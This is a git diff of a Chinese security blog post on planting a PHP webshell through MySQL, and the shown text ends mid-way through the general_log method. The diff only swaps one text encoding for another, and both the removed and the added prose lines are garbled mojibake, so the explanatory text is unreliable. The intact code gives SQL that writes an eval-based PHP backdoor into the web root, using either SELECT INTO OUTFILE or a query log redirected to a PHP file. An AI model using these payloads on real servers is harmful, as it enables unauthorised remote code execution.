@@ -1,18 +1,18 @@
 ---
 layout: post
-title: MySQL»ñÈ¡Webshell
-categories: [°²È«, MySQL, Webshell]
-description: MySQL»ñÈ¡Webshell
-keywords: °²È«, MySQL, webshell
+title: MySQLè·å–Webshell
+categories: [å®‰å…¨, MySQL, Webshell]
+description: MySQLè·å–Webshell
+keywords: å®‰å…¨, MySQL, webshell
 ---
 
-## MySQL»ñÈ¡Webshell
+## MySQLè·å–Webshell
 ### 1.select ... into outfile
-ÔÚMySQLÊı¾İ¿âÃ»ÓĞÉèÖÃµ¼Èëµ¼³öÈ¨ÏŞµÄÊ±ºò£¬ÎÒÃÇ¿ÉÒÔÍ¨¹ıselect ... into outfile»ñÈ¡webshell£¬Èç¹ûMySQLµÄÔËĞĞÈ¨ÏŞ¼«¸ß£¬ÄÇÃ´ÎÒÃÇÍ¨¹ıMySQLÉÏ´«µÄwebshellÒ²»á»ñµÃÏàÓ¦µÄÈ¨ÏŞ£¬ÉõÖÁ¿ÉÒÔÖ±½ÓÌí¼Ó¹ÜÀíÔ±ÕË»§£¬²½ÖèÒ»°ãÈçÏÂ£º
-1. ²éÕÒ¿É¶ÁĞ´Ä¿Â¼
-2. Í¨¹ıselect ... into outfile»ñÈ¡webshell
+åœ¨MySQLæ•°æ®åº“æ²¡æœ‰è®¾ç½®å¯¼å…¥å¯¼å‡ºæƒé™çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡select ... into outfileè·å–webshellï¼Œå¦‚æœMySQLçš„è¿è¡Œæƒé™æé«˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬é€šè¿‡MySQLä¸Šä¼ çš„webshellä¹Ÿä¼šè·å¾—ç›¸åº”çš„æƒé™ï¼Œç”šè‡³å¯ä»¥ç›´æ¥æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·ï¼Œæ­¥éª¤ä¸€èˆ¬å¦‚ä¸‹ï¼š
+1. æŸ¥æ‰¾å¯è¯»å†™ç›®å½•
+2. é€šè¿‡select ... into outfileè·å–webshell
 
-select ... into outfileÓĞÈçÏÂ¼¸ÖÖ·½Ê½£º
+select ... into outfileæœ‰å¦‚ä¸‹å‡ ç§æ–¹å¼ï¼š
 ```sql
 select "<?php @eval($_POST[b]);?>" into outfile "/var/www/html/webshell.php";
 ```
@@ -21,27 +21,27 @@ create table webshell(a blog);
 insert into webshell(a) value("<?php @eval($_POST[b]);?>");
 select a from webshell into outfile "/var/www/html/webshell.php";
 ```
-### 2.Í¨¹ıgeneral_logÑ¡Ïî»ñÈ¡webshell
-1. Ö±½Óµ¼³öwebshellÊ§°Ü
-ÓĞÊ±ºòÍ¨¹ıselect into outfileµÈ·½·¨Ö±½Óµ¼³öwebshell»áÊ§°Ü£¬ÏÔÊ¾´íÎóĞÅÏ¢ÈçÏÂ£º
+### 2.é€šè¿‡general_logé€‰é¡¹è·å–webshell
+1. ç›´æ¥å¯¼å‡ºwebshellå¤±è´¥
+æœ‰æ—¶å€™é€šè¿‡select into outfileç­‰æ–¹æ³•ç›´æ¥å¯¼å‡ºwebshellä¼šå¤±è´¥ï¼Œæ˜¾ç¤ºé”™è¯¯ä¿¡æ¯å¦‚ä¸‹ï¼š
 ```sql
 The MySQL server is ruuning with the --secure-fie-priv option so it cannot execute this statement
 ```
-ÒâË¼ÊÇMysql·şÎñÆ÷ÔËĞĞ"--secure-file-privÑ¡Ïî£¬ËùÒÔ²»ÄÜÖ´ĞĞÕâ¸öÓï¾ä¡£
-2. secure_file_privÑ¡Ïî
-ÔÚMysqlÖĞÊ¹ÓÃsecure_file_privÅäÖÃÏîÀ´Íê³É¶ÔÊı¾İµ¼Èëµ¼³öµÄÏŞÖÆ£¬Ç°ÃæµÄwebshellµ¼³ö¾ÍÊÇÈç´Ë¡£ÔÚMysql¹Ù·½¸ø³öÁË"--secure-file-priv=name limit LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE() to file within specified directory"½âÊÍ£¬ÏŞÖÆµ¼Èëµ¼³öÎÄ¼şµ½Ö¸¶¨µÄÄ¿Â¼£¬Æä¾ßÌåÓÃ·¨ÈçÏÂ£º
-- ÏŞÖÆmysqld²»ÔÊĞíµ¼Èëµ¼³ö
+æ„æ€æ˜¯MysqlæœåŠ¡å™¨è¿è¡Œ"--secure-file-privé€‰é¡¹ï¼Œæ‰€ä»¥ä¸èƒ½æ‰§è¡Œè¿™ä¸ªè¯­å¥ã€‚
+2. secure_file_privé€‰é¡¹
+åœ¨Mysqlä¸­ä½¿ç”¨secure_file_privé…ç½®é¡¹æ¥å®Œæˆå¯¹æ•°æ®å¯¼å…¥å¯¼å‡ºçš„é™åˆ¶ï¼Œå‰é¢çš„webshellå¯¼å‡ºå°±æ˜¯å¦‚æ­¤ã€‚åœ¨Mysqlå®˜æ–¹ç»™å‡ºäº†"--secure-file-priv=name limit LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE() to file within specified directory"è§£é‡Šï¼Œé™åˆ¶å¯¼å…¥å¯¼å‡ºæ–‡ä»¶åˆ°æŒ‡å®šçš„ç›®å½•ï¼Œå…¶å…·ä½“ç”¨æ³•å¦‚ä¸‹ï¼š
+- é™åˆ¶mysqldä¸å…è®¸å¯¼å…¥å¯¼å‡º
 ```sql
 mysqld --secure_file_priv=null
 ```
-- ÏŞÖÆmysqldµÄµ¼ÈëºÍµ¼³öÖ»ÄÜ·¢ÉúÔÚ/tmp/Ä¿Â¼ÏÂ
+- é™åˆ¶mysqldçš„å¯¼å…¥å’Œå¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨/tmp/ç›®å½•ä¸‹
 ```sql
 mysqld --secure_file_priv=/tmp/
 ```
-- ²»¶ÔmysqldµÄµ¼ÈëºÍµ¼³ö×öÏŞÖÆ£¬ÔÚ/etc/my.cnfÎÄ¼şÖĞ²»Ö¸¶¨Öµ
+- ä¸å¯¹mysqldçš„å¯¼å…¥å’Œå¯¼å‡ºåšé™åˆ¶ï¼Œåœ¨/etc/my.cnfæ–‡ä»¶ä¸­ä¸æŒ‡å®šå€¼
 
-3. Í¨¹ıgeneral_logºÍgeneral_log_fileÀ´»ñÈ¡webshell
-mysql´ò¿ªgeneral_logºó£¬ËùÓĞµÄ²éÑ¯Óï¾ä¶¼¿ÉÒÔÔÚgeneral_logÎÄ¼şÖĞÒÔ¿É¶ÁµÄ·½Ê½µÃµ½£¬Ò²¾ÍÊÇËµ£¬general_log_file»á¼ÇÂ¼ËùÓĞµÄ²éÑ¯Óï¾ä£¬ÒÔÔ­Ê¼µÄ×´Ì¬À´ÏÔÊ¾£¬Èç¹û½«general_log¿ª¹Ø´ò¿ª£¬general_log_fileÉèÖÃÎªÒ»¸öphpÎÄ¼ş£¬Ôò²éÑ¯µÄ²Ù×÷½«»áÈ«²¿Ğ´Èëµ½general_log_fileÖ¸¶¨µÄÎÄ¼şÖĞ£¬Í¨¹ı·ÃÎÊgeneral_log_fileÖ¸¶¨µÄÎÄ¼şÀ´»ñÈ¡webshell£¨×¢Òâ£ºgeneral_log_fileËùÔÚÄ¿Â¼Ò»¶¨Òª¾ß±¸¶ÁĞ´È¨ÏŞ£¬Í¬Ê±¸ÃÄ¿Â¼Ó¦¸ÃÔÚweb·şÎñËùÄÜ¸²¸ÇµÄ·¶Î§Ö®ÄÚ£©¡£Õû¸ö¹ı³ÌÖ´ĞĞ²½ÖèÈçÏÂ£º
+3. é€šè¿‡general_logå’Œgeneral_log_fileæ¥è·å–webshell
+mysqlæ‰“å¼€general_logåï¼Œæ‰€æœ‰çš„æŸ¥è¯¢è¯­å¥éƒ½å¯ä»¥åœ¨general_logæ–‡ä»¶ä¸­ä»¥å¯è¯»çš„æ–¹å¼å¾—åˆ°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œgeneral_log_fileä¼šè®°å½•æ‰€æœ‰çš„æŸ¥è¯¢è¯­å¥ï¼Œä»¥åŸå§‹çš„çŠ¶æ€æ¥æ˜¾ç¤ºï¼Œå¦‚æœå°†general_logå¼€å…³æ‰“å¼€ï¼Œgeneral_log_fileè®¾ç½®ä¸ºä¸€ä¸ªphpæ–‡ä»¶ï¼Œåˆ™æŸ¥è¯¢çš„æ“ä½œå°†ä¼šå…¨éƒ¨å†™å…¥åˆ°general_log_fileæŒ‡å®šçš„æ–‡ä»¶ä¸­ï¼Œé€šè¿‡è®¿é—®general_log_fileæŒ‡å®šçš„æ–‡ä»¶æ¥è·å–webshellï¼ˆæ³¨æ„ï¼šgeneral_log_fileæ‰€åœ¨ç›®å½•ä¸€å®šè¦å…·å¤‡è¯»å†™æƒé™ï¼ŒåŒæ—¶è¯¥ç›®å½•åº”è¯¥åœ¨webæœåŠ¡æ‰€èƒ½è¦†ç›–çš„èŒƒå›´ä¹‹å†…ï¼‰ã€‚æ•´ä¸ªè¿‡ç¨‹æ‰§è¡Œæ­¥éª¤å¦‚ä¸‹ï¼š
 ```sql
 set global general_log='on';
 set global general_log_file='/var/www/html/webshell.php';
